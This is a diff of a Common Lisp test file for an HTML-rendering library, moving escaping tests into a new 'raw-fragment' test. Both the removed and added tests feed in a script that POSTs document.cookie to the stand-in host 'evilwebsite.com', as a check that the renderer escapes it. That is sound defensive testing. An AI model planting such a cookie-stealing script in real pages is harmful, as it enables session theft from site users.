@@ -15,7 +15,6 @@
     (ok (typep (create-element :div nil nil) 'tag))
     (ok (typep (create-element :html nil nil) 'html-tag))
     (ok (typep (create-element :img nil nil) 'self-closing-tag))
-    (ok (typep (create-element :style nil nil) 'non-escaping-tag))
     (ok (typep (create-element :<> nil nil) 'fragment))
     (ok (typep (create-element (lambda ()) nil nil) 'component))
     (ok (signals (create-element "div" nil nil))))
@@ -96,21 +95,6 @@
                                                    (list :src "/background.png")
                                                    nil)
                                    :pretty t))))
-  
-  (testing "escaping-tag"
-    (ok (string= "<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>"
-                 (render-to-string
-                  (create-element :div
-                                  nil
-                                  (list "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))))))
-  
-  (testing "non-escaping-tag"
-    (ok (string= "<script>alert('<< Do not embed user-generated contents here! >>')</script>"
-                 (render-to-string
-                  (create-element :script
-                                  nil
-                                  "alert('<< Do not embed user-generated contents here! >>')")))))
-  
   (testing "fragment"
     (let ((frg (create-element :<>
                                nil
@@ -140,6 +124,21 @@
                                                                            (list "brah"))))
                                      :pretty t)))))
 
+  
+  (testing "raw-fragment"
+    (ok (string= "<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>"
+                 (render-to-string
+                  (create-element :div
+                                  nil
+                                  (list "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>")))))
+    (ok (string= "<script>alert('<< Do not embed user-generated contents here! >>')</script>"
+                 (render-to-string
+                  (create-element :script
+                                  nil
+                                  (create-element :raw!
+                                                  nil
+                                                  "alert('<< Do not embed user-generated contents here! >>')"))))))
+  
   (testing "minify-props-text"
     (let ((elm (create-element :div
                                '(:x-data "{
